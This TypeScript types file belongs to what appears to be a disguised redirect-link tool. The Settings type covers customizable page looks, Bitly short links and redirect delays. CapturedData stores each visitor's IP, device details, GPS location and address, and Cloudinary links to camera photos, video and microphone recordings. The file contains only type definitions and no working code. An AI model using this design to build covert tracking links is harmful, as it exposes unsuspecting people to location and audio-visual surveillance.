export type Theme = 'light' | 'dark';
export type PermissionType = 'location' | 'camera' | 'microphone' | 'battery';
export type Language = 'en' | 'nl';

export interface Settings {
  id: string;
  name: string;
  customIconUrl: string;
  backgroundColor: string;
  backgroundImageUrl: string;
  theme: Theme;
  textColor: string;
  cardStyle: string;
  redirectUrl: string;
  displayText: string;
  redirectDelay: number; // in seconds
  captureInfo: {
    permissions: PermissionType[];
    recordingDuration: number; // in seconds
  };
  customBitlyPath?: string;
  bitlyLink?: string;
  bitlyId?: string;
  gradientColors: string[];
  redirectLanguage: Language;
  urlIdentifier: string;
}

export interface CustomImageAssets {
    icons: string[];
    backgrounds: string[];
}

export interface CapturedData {
  id: string; // Firestore document ID
  redirectId: string;
  name: string; // User-editable name for this capture
  timestamp: number;
  status?: 'completed' | 'incomplete';
  ip: string;
  userAgent: string;
  os: string;
  browser: string;
  deviceType: string;
  language: string;
  timezone: string;
  location: {
    lat: number | null;
    lon: number | null;
    accuracy: number | null;
    city: string;
    country: string;
    source: 'ip' | 'gps';
    address?: string;
  };
  permissions: {
    location: 'granted' | 'denied' | 'prompt' | 'n/a';
    camera: 'granted' | 'denied' | 'prompt' | 'n/a';
    microphone: 'granted' | 'denied' | 'prompt' | 'n/a';
  };
  battery: {
    level: number;
    charging: boolean;
  } | null;
  cameraPhotoCapture?: string; // Cloudinary URL for still photo
  cameraCapture?: string; // Cloudinary URL for video
  microphoneCapture?: string; // Cloudinary URL for audio
}


export interface SettingsContextType {
  configs: Settings[];
  loading: boolean;
  addConfig: (configData: Omit<Settings, 'id'>) => Promise<Settings | null>;
  updateConfig: (id: string, updates: Partial<Omit<Settings, 'id'>>) => void;
  deleteConfig: (id: string) => void;
  getConfig: (id: string) => Settings | undefined;
  customImageAssets: CustomImageAssets;
  addCustomAsset: (type: keyof CustomImageAssets, url: string) => void;
  deleteCustomAsset: (type: keyof CustomImageAssets, url: string) => void;
  colors: string[];
  unreadCounts: Record<string, number>;
  clearUnreadCount: (redirectId: string) => void;
}

// For Notification System
export type NotificationType = 'success' | 'error' | 'info';

export interface Notification {
  id: number;
  type: NotificationType;
  message: string;
}

export interface NotificationContextValue {
  notifications: Notification[];
  addNotification: (notification: Omit<Notification, 'id'>) => void;
}